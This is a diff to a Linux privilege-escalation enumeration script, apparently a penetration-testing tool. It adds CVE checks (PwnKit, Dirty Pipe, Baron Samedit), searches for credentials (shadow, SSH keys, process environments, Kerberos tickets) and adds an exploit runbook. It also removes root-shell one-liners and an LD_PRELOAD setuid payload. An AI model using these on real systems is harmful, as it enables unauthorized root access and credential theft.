@@ -14,7 +14,13 @@
 #           -q  quiet: findings only (skip the raw dumps)
 #           -o  also write everything to a file
 #
-# Findings marked [!] are worth a closer look.
+# Findings marked [!] are worth a closer look. Every [!] that maps to a known
+# escalation path is repeated at the end under "How to exploit", tailored to the
+# exact file / binary / privilege found on THIS host, with the concrete steps.
+#
+# The exploitation guidance points at EXISTING public tools and techniques
+# (GTFOBins, PwnKit/Dirty Pipe PoCs, impacket, john, …). It does not generate
+# exploit code - you still run the referenced tool yourself, within your ROE.
 
 export LC_ALL=C
 QUIET=0; OUT=""; SELFTEST=0
@@ -27,14 +33,29 @@ while getopts "qo:th" opt; do
   esac
 done
 
-# --- output helpers (no colour if not a TTY, so piped/logged output is clean) ---
-if [ -t 1 ]; then C_H='\033[1;36m'; C_F='\033[1;33m'; C_R='\033[0m'; else C_H=''; C_F=''; C_R=''; fi
-_emit() { if [ -n "$OUT" ]; then printf '%b\n' "$1" | sed 's/\x1b\[[0-9;]*m//g' >>"$OUT"; fi; printf '%b\n' "$1"; }
+# --- output helpers ---
+# Colour only for an interactive terminal AND when NOT also writing a report.
+# With -o the entire run is teed to the file (see main() below), so we keep the
+# output plain everywhere - that captures 100% of it, including raw command
+# dumps, without embedding escape codes in the report.
+if [ -t 1 ] && [ -z "$OUT" ]; then C_H='\033[1;36m'; C_F='\033[1;33m'; C_R='\033[0m'; else C_H=''; C_F=''; C_R=''; fi
+_emit() { printf '%b\n' "$1"; }
 sec()  { _emit ""; _emit "${C_H}==== $* ====${C_R}"; }
 info() { [ "$QUIET" -eq 1 ] || _emit "$*"; }
 find_() { _emit "${C_F}[!] $*${C_R}"; }         # a finding worth attention
 have() { command -v "$1" >/dev/null 2>&1; }
 cat_() { [ "$QUIET" -eq 1 ] && return 0; [ -r "$1" ] && { _emit "--- $1 ---"; sed 's/^/    /' "$1" 2>/dev/null; }; }
+
+# --- exploitation-playbook accumulator ---------------------------------------
+# flag TAG "detail"   records a vector (+ the specific artifact found) so the
+# "How to exploit" section at the end can render a tailored runbook. Kept in a
+# shell variable; loops that record run via  < <(...)  process substitution so
+# they stay in the current shell (a piped 'while read' would lose the append).
+PB=""
+flag() { PB="${PB}${1}	${2}
+"; }
+pb_has()  { printf '%s' "$PB" | grep -q "^$1	"; }
+pb_vals() { printf '%s' "$PB" | awk -F'\t' -v t="$1" '$1==t && $2!=""{print $2}' | sort -u; }
 
 # --- self-test (pre-flight): verify the script + host, run NO enumeration ---
 if [ "$SELFTEST" -eq 1 ]; then
@@ -70,9 +91,13 @@ if [ "$SELFTEST" -eq 1 ]; then
   exit 0
 fi
 
-[ -n "$OUT" ] && : >"$OUT"
+# Everything the run prints is produced inside main() so a single tee at the end
+# captures ALL of it in the report - including raw command dumps, not just the
+# lines that pass through _emit. (This fixes the -o "missing output" bug.)
+main() {
 _emit "${C_H}recce-enum${C_R}  host=$(hostname 2>/dev/null)  user=$(id -un 2>/dev/null)  $(date 2>/dev/null)"
 _emit "read-only local enumeration - nothing on this host is modified"
+WHO=$(id -un 2>/dev/null)
 
 # ============================================================ system / kernel
 sec "System & kernel"
@@ -81,57 +106,87 @@ cat_ /etc/os-release
 info "uptime: $(uptime 2>/dev/null)"
 KREL=$(uname -r 2>/dev/null)
 info "kernel release: $KREL"
+kmaj=${KREL%%.*}; kmin=$(printf '%s' "$KREL" | cut -d. -f2); kmin=${kmin%%[!0-9]*}
+# Distro (some LPEs are distro-gated).
+DISTRO=$(. /etc/os-release 2>/dev/null; printf '%s' "${ID:-}")
+DVER=$(. /etc/os-release 2>/dev/null; printf '%s' "${VERSION_ID:-}")
 # Cheap heuristic: very old kernels have many public local exploits.
-kmaj=${KREL%%.*}; kmin=$(printf '%s' "$KREL" | cut -d. -f2)
 if [ -n "$kmaj" ] && { [ "$kmaj" -lt 4 ] || { [ "$kmaj" -eq 4 ] && [ "${kmin:-0}" -lt 15 ]; }; }; then
-  find_ "Old kernel ($KREL) - run a local-exploit suggester (linux-exploit-suggester.sh) offline"
+  find_ "Old kernel ($KREL) - run a local-exploit suggester (linux-exploit-suggester.sh) offline"; flag KERNEL_OLD "$KREL"
+fi
+# DirtyCow (CVE-2016-5195): kernels before ~4.8.3 (huge install base historically).
+if [ -n "$kmaj" ] && { [ "$kmaj" -lt 4 ] || { [ "$kmaj" -eq 4 ] && [ "${kmin:-0}" -le 8 ]; }; }; then
+  find_ "Kernel $KREL is in the Dirty COW (CVE-2016-5195) range (< 4.8.3) - verify patch level"; flag DIRTYCOW "$KREL"
 fi
 # Dirty Pipe (CVE-2022-0847): kernel 5.8 up to 5.16.11 / 5.15.25 / 5.10.102.
 if [ "$kmaj" = "5" ] && [ -n "$kmin" ] && [ "$kmin" -ge 8 ] && [ "$kmin" -le 16 ]; then
-  find_ "Kernel $KREL is in the Dirty Pipe (CVE-2022-0847) range (5.8-5.16.11) - verify patch level"
+  find_ "Kernel $KREL is in the Dirty Pipe (CVE-2022-0847) range (5.8-5.16.11) - verify patch level"; flag DIRTYPIPE "$KREL"
+fi
+# OverlayFS / GameOver(lay) (CVE-2021-3493, CVE-2023-2640/32629): Ubuntu-specific.
+if [ "$DISTRO" = "ubuntu" ]; then
+  find_ "Ubuntu $DVER (kernel $KREL) - check OverlayFS LPE CVE-2021-3493 and GameOver(lay) CVE-2023-2640/2023-32629 (Ubuntu-only, public one-liners)"; flag OVERLAYFS "$DVER/$KREL"
+fi
+# Looney Tunables (CVE-2023-4911): glibc ld.so, GLIBC_TUNABLES buffer overflow.
+if have ldd; then
+  GLIBC=$(ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
+  info "glibc: ${GLIBC:-?}"
+  case "$GLIBC" in
+    2.34|2.35|2.36|2.37) find_ "glibc $GLIBC - check Looney Tunables CVE-2023-4911 (GLIBC_TUNABLES ld.so overflow -> root; public PoC)"; flag LOONEY "$GLIBC";;
+  esac
 fi
 [ -r /proc/version ] && info "$(cat /proc/version 2>/dev/null)"
 info "arch: $(uname -m 2>/dev/null)"
 # PwnKit (CVE-2021-4034): any pkexec/polkit before Jan-2022 is exploitable.
 if have pkexec; then
   pv=$( { dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null; } | grep -oE '0\.[0-9]+' | head -1)
-  find_ "pkexec present (polkit ${pv:-?}) - verify PwnKit CVE-2021-4034 patch (fixed Jan-2022); trivially root if unpatched"
+  find_ "pkexec present (polkit ${pv:-?}) - verify PwnKit CVE-2021-4034 patch (fixed Jan-2022); trivially root if unpatched"; flag PWNKIT "polkit ${pv:-?}"
 fi
+# ld.so.preload: if writable, every dynamically-linked SUID call loads your lib.
+[ -e /etc/ld.so.preload ] && { info "/etc/ld.so.preload exists: $(cat /etc/ld.so.preload 2>/dev/null | tr '\n' ' ')"; [ -w /etc/ld.so.preload ] && { find_ "/etc/ld.so.preload is WRITABLE -> global library injection into every SUID binary"; flag LDPRELOAD_FILE "/etc/ld.so.preload"; }; }
 
 # ============================================================ current context
 sec "Who am I / privileges"
 info "$(id 2>/dev/null)"
 info "groups: $(groups 2>/dev/null)"
-case " $(id -Gn 2>/dev/null) " in
-  *" docker "*)  find_ "In the 'docker' group -> trivially root (mount / into a container)";;
-esac
-case " $(id -Gn 2>/dev/null) " in
-  *" lxd "*|*" lxc "*) find_ "In the 'lxd/lxc' group -> root via a privileged container";;
-esac
-case " $(id -Gn 2>/dev/null) " in
-  *" disk "*)  find_ "In the 'disk' group -> read/write raw devices (debugfs /dev/sdaX -> read /etc/shadow)";;
-esac
-case " $(id -Gn 2>/dev/null) " in
-  *" adm "*)   find_ "In the 'adm' group -> read system logs (may contain creds)";;
-esac
+GRPS=" $(id -Gn 2>/dev/null) "
+case "$GRPS" in *" docker "*)  find_ "In the 'docker' group -> trivially root (mount / into a container)"; flag DOCKER_GRP "docker group";; esac
+case "$GRPS" in *" lxd "*|*" lxc "*) find_ "In the 'lxd/lxc' group -> root via a privileged container"; flag LXD_GRP "lxd/lxc group";; esac
+case "$GRPS" in *" disk "*)  find_ "In the 'disk' group -> read/write raw devices (debugfs /dev/sdaX -> read /etc/shadow)"; flag DISK_GRP "disk group";; esac
+case "$GRPS" in *" adm "*)   find_ "In the 'adm' group -> read system logs (may contain creds)"; flag ADM_GRP "adm group";; esac
+case "$GRPS" in *" video "*) info "In the 'video' group -> can read the framebuffer (/dev/fb0) - screen capture";; esac
 [ "$(id -u 2>/dev/null)" = "0" ] && find_ "Already UID 0 (root)"
+# Other UID-0 accounts in passwd (a hidden backdoor already present).
+awk -F: '$3==0 && $1!="root"{print $1}' /etc/passwd 2>/dev/null | while read -r u; do find_ "Non-root account with UID 0: $u"; done
 
 # ============================================================ sudo
 sec "Sudo"
 if have sudo; then
   SUV=$(sudo -V 2>/dev/null | head -1)
   info "$SUV"
+  sv=$(printf '%s' "$SUV" | grep -oE '1\.[0-9]+\.[0-9]+[a-z]*[0-9]*' | head -1)
   # Baron Samedit (CVE-2021-3156) affects sudo < 1.9.5p2.
-  sv=$(printf '%s' "$SUV" | grep -oE '1\.[0-9]+\.[0-9]+' | head -1)
   case "$sv" in
-    1.8.*|1.9.0|1.9.1|1.9.2|1.9.3|1.9.4) find_ "sudo $sv may be vulnerable to CVE-2021-3156 (Baron Samedit) - local root";;
+    1.8.*|1.9.0*|1.9.1*|1.9.2*|1.9.3*|1.9.4*|1.9.5|1.9.5p1) find_ "sudo $sv may be vulnerable to CVE-2021-3156 (Baron Samedit) - local root"; flag SUDO_SAMEDIT "$sv";;
+  esac
+  # CVE-2023-22809 (sudoedit -e arbitrary file write): sudo 1.8.0 - 1.9.12p1.
+  case "$sv" in
+    1.8.*|1.9.0*|1.9.1*|1.9.2*|1.9.3*|1.9.4*|1.9.5*|1.9.6*|1.9.7*|1.9.8*|1.9.9*|1.9.10*|1.9.11*|1.9.12|1.9.12p1) find_ "sudo $sv - if you have any sudoedit/-e rule, check CVE-2023-22809 (edit arbitrary files as root)"; flag SUDO_22809 "$sv";;
   esac
   SUDOL=$(sudo -n -l 2>/dev/null)
   if [ -n "$SUDOL" ]; then
     info "sudo -l (no password prompt):"; printf '%s\n' "$SUDOL" | sed 's/^/    /'
-    printf '%s' "$SUDOL" | grep -qi "NOPASSWD" && find_ "NOPASSWD sudo entries present -> check GTFOBins for the allowed binaries"
-    printf '%s' "$SUDOL" | grep -qiE '\(ALL(\s*:\s*ALL)?\)\s*ALL' && find_ "sudo grants (ALL) ALL -> full root"
-    printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_PRELOAD" && find_ "LD_PRELOAD preserved in sudo env -> library injection to root"
+    printf '%s' "$SUDOL" | grep -qiE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL' && { find_ "sudo grants (ALL) ALL -> full root"; flag SUDO_ALL "(ALL) ALL"; }
+    printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_PRELOAD" && { find_ "LD_PRELOAD preserved in sudo env -> library injection to root"; flag SUDO_LDPRELOAD "env_keep LD_PRELOAD"; }
+    printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_LIBRARY_PATH" && { find_ "LD_LIBRARY_PATH preserved in sudo env -> library injection to root"; flag SUDO_LDLIB "env_keep LD_LIBRARY_PATH"; }
+    printf '%s' "$SUDOL" | grep -qi "SETENV" && info "    SETENV present -> you can pass env vars into the sudo command (aids LD_* tricks)"
+    # Pull the concrete NOPASSWD binaries so the playbook can map each to GTFOBins.
+    printf '%s\n' "$SUDOL" | grep -iE 'NOPASSWD' | grep -oE '/[A-Za-z0-9_./-]+' | sort -u | while read -r sb; do
+      bn=$(basename "$sb")
+      find_ "NOPASSWD sudo: $sb -> GTFOBins '$bn' #sudo (root, no password)"
+    done
+    # Record the whole no-pass allow-list for the playbook (basenames).
+    NPB=$(printf '%s\n' "$SUDOL" | grep -iE 'NOPASSWD' | grep -oE '/[A-Za-z0-9_./-]+' | xargs -r -n1 basename 2>/dev/null | sort -u | tr '\n' ' ')
+    [ -n "$NPB" ] && flag SUDO_NOPASSWD "$NPB"
   else
     info "sudo -l: needs a password or not permitted (try 'sudo -l' interactively)"
   fi
@@ -143,22 +198,37 @@ for f in /etc/sudoers.d/*; do cat_ "$f"; done
 sec "SUID / SGID / capabilities"
 # GTFOBins-known SUID abusables worth flagging immediately.
 GTFO='aa-exec|ab|agetty|alpine|ar|arj|arp|ash|aspell|atobm|awk|base32|base64|basenc|bash|bridge|busybox|cabextract|capsh|cat|chmod|chown|chroot|cp|cpio|csh|csplit|cut|dash|date|dd|dialog|diff|dmsetup|docker|dosbox|ed|emacs|env|eqn|expand|expect|file|find|flock|fmt|fold|gawk|gcore|gdb|genie|gimp|grep|gtester|hd|head|hexdump|highlight|iconv|install|ionice|ip|jjs|join|jq|jrunscript|ksh|ld.so|less|logsave|look|lua|make|mawk|more|mosquitto|msgattrib|msgcat|msgconv|msgfilter|msgmerge|msguniq|multitime|mv|nano|nawk|nice|nl|nmap|node|nohup|od|openssl|openvpn|paste|perl|pg|php|pr|python|python2|python3|readelf|restic|rev|rlwrap|rsync|rtorrent|run-parts|rvim|scp|screen|script|sed|service|setarch|shuf|soelim|sort|sqlite3|ss|ssh|start-stop-daemon|stdbuf|strace|strings|sysadmctl|systemctl|tac|tail|tar|taskset|tclsh|tee|telnet|tftp|tic|time|timeout|troff|ul|unexpand|uniq|unshare|unzip|update-alternatives|vi|vim|watch|wc|wget|xargs|xxd|xz|zip|zsh|zsoelim'
+# Baseline of expected system SUID roots - anything else is worth a manual look.
+SUID_BASE='ping|ping6|su|sudo|mount|umount|passwd|chsh|chfn|gpasswd|newgrp|pkexec|fusermount|fusermount3|ntfs-3g|dbus-daemon-launch-helper|polkit-agent-helper-1|snap-confine|Xorg|vmware-user-suid-wrapper|sg|expiry|unix_chkpwd|at|crontab|ssh-keysign|write|wall'
 info "SUID binaries:"
-find / -perm -4000 -type f 2>/dev/null | while read -r b; do
+while read -r b; do
+  [ -z "$b" ] && continue
   base=$(basename "$b")
-  if printf '%s' "$base" | grep -qxE "$GTFO"; then find_ "SUID $b - GTFOBins escalation candidate"; else info "    $b"; fi
-done
+  if printf '%s' "$base" | grep -qxE "$GTFO"; then
+    find_ "SUID $b - GTFOBins escalation candidate"; flag SUID_GTFO "$b"
+  elif printf '%s' "$base" | grep -qxE "$SUID_BASE"; then
+    info "    $b"
+  else
+    # Unknown/custom SUID root binary: prime target (relative-path / lib hijack /
+    # env abuse). Worth reversing even without a GTFOBins entry.
+    find_ "Non-standard SUID root binary: $b - inspect (strace for relative-path exec / getenv / system() calls)"; flag SUID_CUSTOM "$b"
+  fi
+done < <(find / -perm -4000 -type f 2>/dev/null)
 info "SGID binaries:"
 find / -perm -2000 -type f 2>/dev/null | sed 's/^/    /'
 if have getcap; then
   info "File capabilities:"
-  getcap -r / 2>/dev/null | while read -r line; do
+  while read -r line; do
+    [ -z "$line" ] && continue
+    capbin=$(printf '%s' "$line" | awk '{print $1}')
     case "$line" in
-      *cap_setuid*|*cap_setgid*|*cap_dac_read_search*|*cap_dac_override*|*cap_sys_admin*|*cap_sys_ptrace*)
-        find_ "Capability: $line -> privesc candidate";;
+      *cap_setuid*) find_ "Capability cap_setuid on $capbin -> setuid(0) then a shell"; flag CAP_SETUID "$capbin";;
+      *cap_setgid*) find_ "Capability cap_setgid on $capbin -> privesc candidate"; flag CAP_GENERIC "$capbin";;
+      *cap_dac_read_search*|*cap_dac_override*) find_ "Capability $line -> read/overwrite any file (e.g. /etc/shadow, /etc/passwd)"; flag CAP_DAC "$capbin";;
+      *cap_sys_admin*|*cap_sys_ptrace*|*cap_sys_module*) find_ "Capability $line -> powerful privesc candidate (namespace/ptrace/module load)"; flag CAP_GENERIC "$capbin";;
       *) info "    $line";;
     esac
-  done
+  done < <(getcap -r / 2>/dev/null)
 fi
 
 # ============================================================ cron / timers
@@ -167,8 +237,15 @@ for f in /etc/crontab /etc/cron.d/* ; do cat_ "$f"; done
 info "cron dirs:"; ls -la /etc/cron.* 2>/dev/null | sed 's/^/    /'
 # Writable script referenced by a root cron/timer is a classic root path.
 for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
-  [ -d "$d" ] && find "$d" -maxdepth 1 -type f -writable 2>/dev/null | while read -r w; do find_ "World/'$USER'-writable cron script: $w"; done
+  [ -d "$d" ] && while read -r w; do [ -n "$w" ] && { find_ "World/'$WHO'-writable cron script: $w"; flag CRON_WRITABLE "$w"; }; done < <(find "$d" -maxdepth 1 -type f -writable 2>/dev/null)
 done
+# Wildcard injection: a root cron running tar/rsync/chown/chmod/zip with a bare
+# '*' in a writable dir lets you smuggle args via crafted filenames.
+while read -r line; do
+  case "$line" in
+    *tar\ *\**|*rsync\ *\**|*chown\ *\**|*chmod\ *\**|*zip\ *\**|*7z\ *\**) find_ "Cron wildcard-injection candidate: $line"; flag CRON_WILDCARD "$line";;
+  esac
+done < <(cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#')
 crontab -l 2>/dev/null | grep -v '^#' | sed 's/^/    (user cron) /'
 have systemctl && systemctl list-timers --all 2>/dev/null | sed 's/^/    /' | head -40
 
@@ -176,37 +253,54 @@ have systemctl && systemctl list-timers --all 2>/dev/null | sed 's/^/    /' | he
 sec "Services & processes running as root"
 info "Processes (root-owned, top by start):"
 ps -eo user,pid,comm,args 2>/dev/null | awk '$1=="root"' | sed 's/^/    /' | head -60
+# Passwords passed on a command line (visible to any user via ps).
+while read -r line; do [ -n "$line" ] && { find_ "Possible credential in a process command line: $line"; flag PS_CREDS "$line"; }; done < <(ps -eo args 2>/dev/null | grep -iE -- '-p *[^ ]|password=|--pass|PGPASSWORD|MYSQL_PWD|token=' | grep -viE 'grep|recce-enum' | head -10)
+# Root-run network daemons that are classic local-root paths.
+if ps -eo user,comm 2>/dev/null | awk '$1=="root"{print $2}' | grep -qx 'mysqld\|mariadbd'; then
+  find_ "MySQL/MariaDB running as root -> if you have DB creds, a User-Defined Function (UDF) gives command exec as root"; flag MYSQL_ROOT "mysqld/root"
+fi
+if ps -eo comm 2>/dev/null | grep -qx 'redis-server'; then
+  redisbind=$(ss -tlnp 2>/dev/null | grep ':6379' )
+  [ -n "$redisbind" ] && { find_ "redis-server listening ($redisbind) - if unauthenticated, write an SSH key / cron via CONFIG SET"; flag REDIS "$redisbind"; }
+fi
 # Writable systemd unit files / writable binaries a root service runs.
 if have systemctl; then
-  systemctl list-unit-files --type=service 2>/dev/null | awk '{print $1}' | while read -r u; do
+  while read -r u; do
+    [ -z "$u" ] && continue
     p=$(systemctl show -p FragmentPath --value "$u" 2>/dev/null)
-    [ -n "$p" ] && [ -w "$p" ] && find_ "Writable service unit: $p ($u)"
-  done
+    [ -n "$p" ] && [ -w "$p" ] && { find_ "Writable service unit: $p ($u)"; flag SVC_UNIT "$p"; }
+  done < <(systemctl list-unit-files --type=service 2>/dev/null | awk 'NR>1{print $1}' | grep '\.service$')
 fi
 # Writable binaries invoked by root processes.
-ps -eo user,args 2>/dev/null | awk '$1=="root"{print $2}' | sort -u | while read -r bin; do
-  [ -f "$bin" ] && [ -w "$bin" ] && find_ "Root process runs a WRITABLE binary: $bin"
-done
+while read -r bin; do
+  [ -n "$bin" ] && [ -f "$bin" ] && [ -w "$bin" ] && { find_ "Root process runs a WRITABLE binary: $bin"; flag ROOT_WRITABLE_BIN "$bin"; }
+done < <(ps -eo user,args 2>/dev/null | awk '$1=="root"{print $2}' | sort -u)
 
 # ============================================================ writable / PATH
 sec "Writable files & PATH hijack"
 info "PATH: $PATH"
-IFS=:; for d in $PATH; do [ -d "$d" ] && [ -w "$d" ] && find_ "Writable dir in PATH: $d (binary planting)"; done; unset IFS
-[ -w /etc/passwd ]     && find_ "/etc/passwd is WRITABLE -> add a UID 0 user"
-[ -w /etc/shadow ]     && find_ "/etc/shadow is WRITABLE"
-[ -r /etc/shadow ]     && find_ "/etc/shadow is READABLE by $(id -un) -> crack hashes"
-[ -w /etc/sudoers ]    && find_ "/etc/sudoers is WRITABLE"
+IFS=:; for d in $PATH; do [ -d "$d" ] && [ -w "$d" ] && { find_ "Writable dir in PATH: $d (binary planting)"; flag PATH_WRITABLE "$d"; }; done; unset IFS
+[ -w /etc/passwd ]     && { find_ "/etc/passwd is WRITABLE -> add a UID 0 user"; flag PASSWD_WRITABLE "/etc/passwd"; }
+[ -w /etc/shadow ]     && { find_ "/etc/shadow is WRITABLE"; flag SHADOW_WRITABLE "/etc/shadow"; }
+[ -r /etc/shadow ] && [ "$(id -u 2>/dev/null)" != "0" ] && { find_ "/etc/shadow is READABLE by $WHO -> crack hashes"; flag SHADOW_READABLE "/etc/shadow"; }
+[ -w /etc/sudoers ]    && { find_ "/etc/sudoers is WRITABLE"; flag SUDOERS_WRITABLE "/etc/sudoers"; }
 info "World-writable files in sensitive dirs (sample):"
 find /etc /usr/local /opt -writable -type f 2>/dev/null | sed 's/^/    /' | head -40
+# Other users' home dirs you can read (creds, keys, notes).
+while read -r h; do
+  [ -z "$h" ] && continue
+  case "$h" in /root|/home/*) [ -r "$h" ] && [ "$h" != "$HOME" ] && info "readable home: $h";; esac
+done < <(awk -F: '$3>=0 && $6 ~ /^\/(home|root)/{print $6}' /etc/passwd 2>/dev/null | sort -u)
 
 # ============================================================ containers
 sec "Container / virtualization context"
 if [ -f /.dockerenv ] || grep -qaE 'docker|kubepods|containerd|lxc' /proc/1/cgroup 2>/dev/null; then
-  find_ "Running INSIDE a container - check for host mounts, caps, and the docker socket"
+  find_ "Running INSIDE a container - check for host mounts, caps, and the docker socket"; flag IN_CONTAINER "container"
 fi
 if [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
-  find_ "Writable /var/run/docker.sock -> spawn a privileged container to own the host"
+  find_ "Writable /var/run/docker.sock -> spawn a privileged container to own the host"; flag DOCKER_SOCK "/var/run/docker.sock"
 fi
+# A container with CAP_SYS_ADMIN and no seccomp is a host-escape path.
 info "capabilities of PID 1: $(grep -i cap /proc/1/status 2>/dev/null | tr '\n' ' ')"
 have systemd-detect-virt && info "virt: $(systemd-detect-virt 2>/dev/null)"
 
@@ -216,7 +310,7 @@ info "mounts:"; mount 2>/dev/null | sed 's/^/    /' | head -40
 cat_ /etc/fstab
 if [ -r /etc/exports ]; then
   cat_ /etc/exports
-  grep -q "no_root_squash" /etc/exports 2>/dev/null && find_ "NFS export with no_root_squash -> drop a SUID-root binary from a client"
+  grep -q "no_root_squash" /etc/exports 2>/dev/null && { find_ "NFS export with no_root_squash -> drop a SUID-root binary from a client"; flag NFS_NOSQUASH "/etc/exports"; }
 fi
 # Mounts that grant power.
 mount 2>/dev/null | grep -qE 'nosuid' || info "note: some mounts allow suid (default)"
@@ -224,8 +318,8 @@ mount 2>/dev/null | grep -qE 'nosuid' || info "note: some mounts allow suid (def
 # ============================================================ credential hunting
 sec "Credential & secret hunting"
 info "SSH keys / configs:"
-find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | sed 's/^/    /' | head -20
-for f in /root/.ssh/authorized_keys "$HOME/.ssh/authorized_keys" "$HOME/.ssh/config"; do [ -r "$f" ] && find_ "Readable SSH file: $f"; done
+find / \( -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \) 2>/dev/null | while read -r k; do [ -n "$k" ] && { find_ "SSH private key: $k"; flag SSH_KEY "$k"; }; done
+for f in /root/.ssh/authorized_keys "$HOME/.ssh/authorized_keys" "$HOME/.ssh/config"; do [ -r "$f" ] && info "readable SSH file: $f"; done
 info "History files:"
 for f in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" "$HOME/.psql_history" "$HOME/.python_history"; do
   [ -r "$f" ] && { info "    $f"; grep -iE 'pass|secret|token|key|-p |curl|wget|ssh ' "$f" 2>/dev/null | sed 's/^/      >> /' | head -15; }
@@ -233,14 +327,15 @@ done
 info "Config files that often hold secrets:"
 find / \( -name '*.env' -o -name '.env' -o -name 'wp-config.php' -o -name 'settings.py' \
   -o -name 'config.php' -o -name 'database.yml' -o -name '.pgpass' -o -name '.netrc' \
-  -o -name 'credentials' -o -name 'id_rsa' \) 2>/dev/null | sed 's/^/    /' | head -30
+  -o -name 'credentials' \) 2>/dev/null | sed 's/^/    /' | head -30
 for d in "$HOME/.aws" "$HOME/.config/gcloud" "$HOME/.azure" "$HOME/.kube" "$HOME/.docker"; do
-  [ -d "$d" ] && find_ "Cloud/orchestration creds dir present: $d"
+  [ -d "$d" ] && { find_ "Cloud/orchestration creds dir present: $d"; flag CLOUD_CREDS "$d"; }
 done
 # Grep a bounded set of dirs for obvious secrets (fast, avoids whole-FS scan).
 info "Quick secret grep (bounded):"
-grep -rniE 'password[[:space:]]*=|api[_-]?key|secret[[:space:]]*=|BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY' \
-  /etc /opt /var/www /srv 2>/dev/null | sed 's/^/    /' | head -30
+_sec=$(grep -rniE 'password[[:space:]]*=|api[_-]?key|secret[[:space:]]*=|BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY' \
+  /etc /opt /var/www /srv 2>/dev/null | head -30)
+if [ -n "$_sec" ]; then printf '%s\n' "$_sec" | sed 's/^/    /'; flag SECRETS_FOUND "grep hit in /etc,/opt,/var/www,/srv"; fi
 
 # ============================================================ network
 sec "Network"
@@ -257,8 +352,8 @@ elif have rpm; then rpm -qa --qf '%{NAME} %{VERSION}\n' 2>/dev/null | sed 's/^/ 
 
 # ============================================================ deeper credential dive
 sec "Kerberos tickets, keytabs & agent sockets"
-find / \( -name '*.keytab' -o -name 'krb5cc_*' -o -name '*.ccache' \) 2>/dev/null | sed 's/^/    /' | head -20
-[ -n "$KRB5CCNAME" ] && find_ "KRB5CCNAME set: $KRB5CCNAME (usable Kerberos ticket)"
+find / \( -name '*.keytab' -o -name 'krb5cc_*' -o -name '*.ccache' \) 2>/dev/null | while read -r kt; do [ -n "$kt" ] && { find_ "Kerberos ticket/keytab: $kt"; flag KRB_TICKET "$kt"; }; done
+[ -n "$KRB5CCNAME" ] && { find_ "KRB5CCNAME set: $KRB5CCNAME (usable Kerberos ticket)"; flag KRB_TICKET "$KRB5CCNAME"; }
 ls -la /tmp/krb5cc_* /tmp/ssh-* 2>/dev/null | sed 's/^/    /' | head -10
 info "Screen/tmux sockets (attach to another user's session):"
 ls -la /var/run/screen/ /tmp/tmux-* 2>/dev/null | sed 's/^/    /' | head -10
@@ -269,8 +364,10 @@ sec "Root process environments & open FDs (creds leak)"
 # /proc/<pid>/environ of a root process you can read may hold DB/API secrets.
 for pid in $(ps -eo pid,user 2>/dev/null | awk '$2=="root"{print $1}'); do
   if [ -r "/proc/$pid/environ" ]; then
-    leak=$(tr '\0' '\n' <"/proc/$pid/environ" 2>/dev/null | grep -iE 'pass|secret|token|key|cred' )
-    [ -n "$leak" ] && { find_ "Readable root env at /proc/$pid/environ:"; printf '%s\n' "$leak" | sed 's/^/      >> /' | head -8; }
+    # The process may exit between the ps snapshot and this read; suppress the
+    # resulting redirection error (and tr's) with a stderr-muted command group.
+    leak=$( { tr '\0' '\n' <"/proc/$pid/environ"; } 2>/dev/null | grep -iE 'pass|secret|token|key|cred' )
+    [ -n "$leak" ] && { find_ "Readable root env at /proc/$pid/environ:"; printf '%s\n' "$leak" | sed 's/^/      >> /' | head -8; flag PROC_ENV "/proc/$pid/environ"; }
   fi
 done
 
@@ -285,7 +382,7 @@ find /etc /opt /var/www /home /srv \( -name '*.bak' -o -name '*.old' -o -name '*
 sec "Writable shared libraries & ld config"
 cat_ /etc/ld.so.conf
 for d in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null; echo /lib /usr/lib /usr/local/lib); do
-  [ -d "$d" ] && [ -w "$d" ] && find_ "Writable library dir: $d (drop a malicious .so a root binary loads)"
+  [ -d "$d" ] && [ -w "$d" ] && { find_ "Writable library dir: $d (drop a malicious .so a root binary loads)"; flag LIB_DIR_WRITABLE "$d"; }
 done
 
 sec "Environment variables (this shell)"
@@ -298,55 +395,242 @@ info "world-writable dirs missing sticky bit (safe-to-abuse temp):"
 find / -path /proc -prune -o -type d -perm -0002 ! -perm -1000 -print 2>/dev/null | sed 's/^/    /' | head -20
 
 # ============================================================ how to exploit
-# Reference for the [!] findings above: if the script flagged a vector, here is
-# the concrete escalation path. Read-only guidance - nothing is run for you.
-sec "How to exploit (reference for the [!] findings above)"
-xploit() { _emit "  ${C_F}$1${C_R}"; shift; for l in "$@"; do _emit "      $l"; done; }
-xploit "Sudo: NOPASSWD / (ALL) ALL" \
-  "sudo -l  -> for each allowed binary check gtfobins.github.io/#<bin>" \
-  "e.g.  sudo find . -exec /bin/sh \\; -quit   |   sudo vim -c ':!/bin/sh'   |   sudo su"
-xploit "Sudo: LD_PRELOAD kept in env" \
-  "write x.c:  void _init(){setgid(0);setuid(0);system(\"/bin/bash -p\");}" \
-  "gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c ; sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>"
-xploit "Sudo: CVE-2021-3156 (Baron Samedit)" \
-  "sudoedit -s '\\' \$(python3 -c 'print(\"A\"*1000)')  crashes -> use a compiled PoC for your libc"
-xploit "SUID binary (GTFOBins)" \
-  "many keep euid with -p:  bash -p  |  /path/suidbin per gtfobins '#SUID' section" \
-  "e.g.  find . -exec /bin/sh -p \\; -quit   |   cp: copy a payload over a root file   |   nmap --interactive"
-xploit "File capabilities" \
-  "cap_setuid+ep:  ./binary -c 'import os;os.setuid(0);os.system(\"/bin/sh\")' (python)" \
-  "cap_dac_read_search:  read /etc/shadow with the capable binary (e.g. tar/xxd)"
